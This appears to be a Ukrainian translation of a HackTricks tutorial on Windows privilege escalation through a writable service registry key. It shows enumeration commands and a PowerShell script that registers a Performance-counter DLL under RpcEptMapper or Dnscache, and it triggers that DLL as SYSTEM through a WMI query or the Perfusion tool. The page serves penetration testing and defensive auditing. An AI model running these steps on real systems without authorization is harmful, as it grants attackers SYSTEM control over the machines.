# Дозвіл AppendData/AddSubdirectory для реєстру служби

{{#include ../../banners/hacktricks-training.md}}

**Оригінальний допис:** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Підсумок

Якщо у вас є лише **`Create Subkey`** / **`AppendData/AddSubdirectory`** для ключа реєстру служби, це все одно може бути хорошим напрямком для privesc. Зазвичай ви **не можете** безпосередньо перезаписати `ImagePath`, `ServiceDll` або інші наявні значення, але все ще можете створити дочірній ключ **`Performance`** у:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Будь-якому іншому ключі **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, де ваш token має **`KEY_CREATE_SUB_KEY`**

Суть у тому, що Windows досі підтримує застарілу модель реєстрації **PerfLib V1**. Якщо служба має підрозділ **`Performance`**, Windows може завантажити DLL звідти, коли consumer лічильників продуктивності запитує дані.

Згідно з документацією Microsoft, мінімальна реєстрація має такий вигляд:<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Отже, висновок для offensive security такий: **не відкидайте знахідку в реєстрі service лише тому, що ви отримали лише `CreateSubKey`, а не `SetValue`**.<sup>[[3]](#references)</sup>

## Чому цього достатньо для виконання коду

Subkey `Performance` **зазвичай не існує за замовчуванням у цих services**, тому **`KEY_CREATE_SUB_KEY`** — це саме той primitive, який вам потрібен. Щойно key існує та містить `Library`/`Open`/`Collect`/`Close`, будь-який **consumer лічильника продуктивності** може ініціювати завантаження DLL.<sup>[[3]](#references)</sup>

Кілька важливих деталей:

- Значення **`Library`** може вказувати на **повний шлях до DLL**.
- DLL має експортувати **`OpenPerfData`**, **`CollectPerfData`** і **`ClosePerfData`** та повертати `ERROR_SUCCESS`.
- Код виконується в **контексті consumer**, **не обов'язково безпосередньо в самому процесі вразливого service**.
- У класичному випадку `RpcEptMapper` / `Dnscache` **WMI-запит до лічильників продуктивності** може змусити **`wmiprvse.exe`** завантажити DLL від імені **`NT AUTHORITY\SYSTEM`**.

Саме тому цей primitive легко пропустити під час triage: батьківський key service не є «повністю доступним для запису», але його все одно можна weaponize.

## Швидке перерахування

Ручна перевірка за допомогою **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Приклад PowerShell для пошуку суб'єктів із низькими привілеями, які мають **`CreateSubKey`** для ключів служб:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Корисні інструменти:

- **PrivescCheck**: `Get-ModifiableRegistryPath` було створено спеціально для виявлення цього класу проблем.<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: автоматизує DLL drop, реєстрацію `Performance`, WMI trigger, token duplication і очищення на застарілих вразливих цілях (наприклад: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## Сценарій експлуатації

Створіть підрозділ `Performance` і заповніть необхідні значення:<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Потім ініціюйте **привілейований** споживач продуктивності. Класичним прикладом є WMI query над класами `Win32_Perf*`:<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Операційні примітки:

- Запуск **`perfmon.exe`** корисний для перевірки правильності реєстрації лічильника, але зазвичай це лише завантажує DLL у **вашому власному контексті користувача**.
- Для фактичного LPE викличте **привілейований** споживач, наприклад **WMI**.
- Якщо ви пишете власний exploit, безпосередній запуск `cmd.exe` з DLL зазвичай залишає вас у shell у **session 0**. `Perfusion` вирішує це, дублюючи привілейований token у процес, створений у призупиненому стані в session атакувальника.<sup>[[4]](#references)</sup>
- Узгодьте архітектуру DLL із цільовим споживачем (**x64 у системах x64**).

## Примітки щодо версій / останні розробки

Історично вбудованими слабкими ключами були:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` і `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` зазначає, що оновлення **квітня 2021 року** усунули простий шлях exploitation в оновлених **Windows 8 / Windows Server 2012**, тоді як **Windows 7 / Windows Server 2008 R2** залишалися вразливими через **`Dnscache`**.<sup>[[4]](#references)</sup>

Ця primitive **не є лише історичною**. У **січні 2025 року** Microsoft виправила пов’язану проблему AD DS, через яку члени **`Network Configuration Operators`** могли створювати subkeys у **`Dnscache`** і **`NetBT`**, а ту саму ідею реєстрації **Performance-counter DLL** можна було повторно використати для отримання **SYSTEM** у підтримуваних системах.<sup>[[2]](#references)</sup>

Отже, сучасний висновок є загальним: якщо low-privileged principal має **`CreateSubKey`** на **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, перевірте, чи достатньо дочірнього ключа **`Performance`**, перш ніж відкидати це finding.

## References

- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
